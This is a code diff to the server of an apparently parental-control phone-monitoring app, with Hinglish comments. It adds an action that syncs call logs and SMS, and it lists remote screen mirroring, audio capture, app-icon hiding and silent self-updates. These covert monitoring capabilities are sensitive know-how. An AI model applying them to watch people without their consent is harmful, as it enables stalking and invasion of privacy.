@@ -112,7 +112,7 @@ app.delete('/api/children/:id', auth, parentOnly, (req, res) => {
   const c = db.children.find(x => x.id === cid);
   if (c) {
     // Child abhi online hai to pehle release command — permissions strip +
-    // uninstall dialog turant. (Web/parent app khud bhi bhejte hain, par yahan
+    // uninstall dialog turant. (Web dashboard khud bhi bhejta hai, par yahan
     // bhejna guarantee karta hai ki koi bhi client se delete par child saaf ho.)
     wsHub.sendToChild(cid, { type: 'command', id: rid(), action: 'release_protections', params: {} });
     tg.log(`🗑 Remove device: "${c.name}" ka record purge hua (parent ne delete kiya)`);
@@ -121,7 +121,7 @@ app.delete('/api/children/:id', auth, parentOnly, (req, res) => {
   // Sockets band — child app turant reconnect karega, orphan guard use
   // release_protections bhej kar app ko khud clean karwa dega.
   wsHub.closeChild(cid);
-  // Sab parent dashboards (web + parent app) turant refresh — removed device
+  // Sab parent dashboards (web) turant refresh — removed device
   // list me na dikhe.
   wsHub.broadcastToParents({ type: 'children_changed' });
   res.json({ ok: true });
@@ -314,7 +314,8 @@ const ALLOWED_ACTIONS = new Set([
   'mirror_start', 'mirror_stop', 'mirror_request_permission',
   'audio_start', 'audio_stop',
   'show_app_icon', 'hide_app_icon', 'get_apps', 'message', 'release_protections',
-  'heal', 'health', // self-heal trigger + health check (parent app & dashboard use these)
+  'sync_usage', // Report tab "Sync now" — usage + call log + SMS turant sync
+  'heal', 'health', // self-heal trigger + health check (dashboard use these)
   'update_apk' // silent self-update abhi check (dashboard "Child app update" button)
 ]);
 
